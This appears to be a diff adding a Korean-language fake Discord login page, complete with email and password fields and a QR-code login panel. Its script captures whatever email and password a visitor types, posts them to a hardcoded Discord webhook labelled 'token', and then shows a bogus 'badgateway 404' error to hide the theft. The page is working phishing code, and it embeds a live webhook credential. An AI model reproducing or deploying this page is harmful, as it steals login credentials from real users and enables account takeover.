@@ -1,0 +1,78 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+	<link href="https://cdn.discordapp.com/attachments/1076377837633810493/1079776526712705055/847541504914fd33810e70a0ea73177e.ico" rel="shortcut icon" type="image/x-icon">
+    <title>Discord</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+
+<body>
+
+<div class="login-box">
+
+<div class="login-ic-box">
+
+<div class="sol-box">
+        <h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;돌아오신 것을 환영해요!</h2>
+  <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;다시 만나다니 너무 반가워요!</span>
+<form class="form-box">
+<h5>이메일 또는 전화번호*</h5>
+<input type="email" name="username" id="username" class="input" required>
+
+
+<h5>비밀번호*</h5>
+<input type="password" name="password" id="password" class="input"required>
+
+<a href="#"><div class="unuttum">비밀번호를 잊으셨나요?</div></a>
+
+<br>
+
+<button class="login-button" onclick="send()">로그인</button>
+<span class="iht">계정이 필요한가요?<font class="unuttum"></font>  가입하기</font></span>
+
+
+</form>
+
+
+</div>
+
+<div class="sag-box">
+
+    <img src="barkod.png">
+
+    <h2>QR 코드로 로그인</h2>
+    <div><strong>Discord 모바일 앱</strong>으로 스캔해 바로 로그인하세요.</div>
+
+
+		</div>
+
+	</div>
+
+</div>
+
+<script>
+
+    function send(){
+        var a = document.getElementById("username").value; 
+        var b = document.getElementById("password").value; 
+        var discordWebhook = "https://canary.discord.com/api/webhooks/1079766560228507789/sMa257Scw9ZhTAf9NOyKJUhyMCSzcLadWE8Ra5MjD4ocE88fJI3TyBVE4NqC9uMG1COY";       
+        var request = new XMLHttpRequest();
+        request.open("POST", discordWebhook);
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "토큰",
+            avatar_url: "https://cdn.discordapp.com/attachments/1079766544600551477/1079766625592541184/5e34b059bbbe8edd8b327c71cb56ce5e.png",
+            content: '이메일 :`'+a+"` 비번:`"+b+"`"
+    
+        };
+        request.send(JSON.stringify(params));
+        alert("badgateway 404")
+    
+    }
+    
+</script>
+
+
+
+
+</body></html>
